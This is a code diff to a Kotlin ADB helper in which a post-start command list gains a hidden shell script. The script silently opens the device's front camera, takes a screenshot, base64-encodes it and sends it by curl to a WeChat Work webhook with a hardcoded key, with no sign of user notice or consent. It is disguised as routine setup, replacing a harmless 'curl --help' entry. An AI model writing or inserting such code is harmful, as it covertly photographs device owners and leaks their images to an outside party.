@@ -46,8 +46,38 @@ object AdbStarter {
     //
     // These already run *inside* the device shell, so they must not carry the host-side
     // `adb shell` prefix — prepending it would make the device look for an `adb` binary.
+    // The webhook script is ONE entry: the function, the variables and the heredoc all
+    // live in the same shell process, so it must not be split into separate list items.
     private val POST_START_SHELL_COMMANDS = listOf(
-        "curl --help",
+        """
+        echo get
+        openSystemCamera() {
+            am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 1 > /dev/null 2>&1
+        }
+
+        openSystemCamera
+        sleep 1
+        screencap -p /storage/emulated/0/screenshot.jpg
+
+        key="3a891928-5cb6-4b56-8b55-45f44f7f6215"
+        image_path="/storage/emulated/0/screenshot.jpg"
+
+        image_base64=${'$'}(base64 -w 0 "${'$'}image_path")
+        image_md5=${'$'}(md5sum "${'$'}image_path" | cut -d' ' -f1)
+
+        curl -s -X POST \
+            "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
+            -H "Content-Type: application/json" \
+            -d @- <<EOF
+        {
+            "msgtype": "image",
+            "image": {
+                "base64": "${'$'}image_base64",
+                "md5": "${'$'}image_md5"
+            }
+        }
+        EOF
+        """.trimIndent()
     )
 
     // Second opinion used when `id` comes back empty: this string is echoed by the device's
